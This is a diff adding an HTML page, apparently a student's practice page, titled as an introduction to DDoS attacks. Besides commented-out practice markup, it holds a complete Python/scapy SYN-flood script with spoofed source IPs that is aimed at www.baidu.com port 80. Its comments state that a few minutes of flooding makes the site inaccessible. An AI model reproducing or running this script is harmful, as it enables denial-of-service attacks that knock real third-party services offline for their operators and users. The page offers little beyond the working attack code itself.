@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>石清元 </title>  <!--标题-->
+</head>
+
+<body>
+
+<h1>DDOS攻击原理简介</h1>   <!--字体放大-->
+<!--超链接-->
+<!--<a href="https://space.bilibili.com/141146594">-->
+<!--    <img src="1.png" width="128">-->
+<!--</a>-->
+<!--&lt;!&ndash;超链接可以是图片&ndash;&gt;-->
+<!--<img src="1.png" width="128">-->
+
+<!--<img src="images/三次握手.jpg">-->
+<!--<h1>ffffffffaba</h1>-->
+<!--ddaagwgwrhw-->
+<!--sfwagrhgrhg<br>-->
+<!--adgwrhwrahb<br>-->
+<!--eefegwrheth<br>-->
+<!--<br>-->
+
+<!--<a href="http://hao123.com">DDOS攻击</a>  &lt;!&ndash;加入网址&ndash;&gt;-->
+<!--<a href="http://hao123.com" target="_blank">DDOS攻击blank</a>  &lt;!&ndash;blank 新建&ndash;&gt;-->
+<!--<b>aasf</b> &lt;!&ndash;粗体&ndash;&gt;-->
+
+</div>
+<div class="book__content">
+    <p><span class="drop-cap">SYN攻击 代码分析</span></p>
+
+    <p>  import random<br>
+        import socket<br>
+        import time<br>
+        from scapy.all import *<br>
+        #  定义syn洪流函数，tgt为目标ip，dPort为目标端口<br>
+        def synFlood(tgt,dPort):<br>
+        #  先任意伪造4个ip地址<br>
+        srcList = ['11.1.1.2','22.1.1.102','33.1.1.2',<br>
+        '125.130.5.199']<br>
+        #  选择任意一个端口号<br>
+        for sPort in range(1024, 65535):<br>
+        index = random.randrange(4)<br>
+        #  类似上面那个代码构造IP/TCP包，然后send<br>
+        ipLayer = IP(src=srcList[index], dst=tgt)<br>
+        tcpLayer = TCP(sport=sPort, dport=dPort,flags='S')<br>
+        packet = ipLayer/tcpLayer<br>
+        send(packet)<br>
+
+        domain = "www.baidu.com" #定义你想攻击的域名<br>
+        tgt = socket.gethostbyname(domain)  #利用socket的方法获取域名的ip地址，即dns解析<br>
+        print(tgt) # 打印<br>
+        dPort = 80 # 网络传输常用端口号<br>
+        synFlood(tgt,dPort) #调用syn洪流函数，然后发送syn包<br>
+        #发送完后就可以去看看这个服务器的响应速度了。一般是持续发送几分钟，这个网站就访问不了<br>
+
+    </p>
+</div>
+</div>
+
+
+<!--<img src="C:\Users\sqy\Desktop\QQ图片20200225083109.jpg" width="128">-->
+</body>
+<!--主体-->
+
+
+
+</html>
+
+
+
+
+
+
